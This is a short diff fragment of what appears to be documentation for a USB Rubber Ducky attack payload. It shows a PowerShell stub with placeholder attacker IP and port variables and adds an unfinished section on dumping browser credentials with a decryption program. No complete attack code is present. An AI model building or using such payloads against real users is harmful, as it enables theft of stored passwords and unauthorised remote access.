@@ -26,3 +26,6 @@ This payload is intended for use with a USB Rubber Ducky device.
    ```powershell
    $ip = 'YOUR_IP'
    $port = 'YOUR_PORT'
+### Dump Browser Credentials 
+
+In order to obtain teh clear passwords you will need a decription program like : 
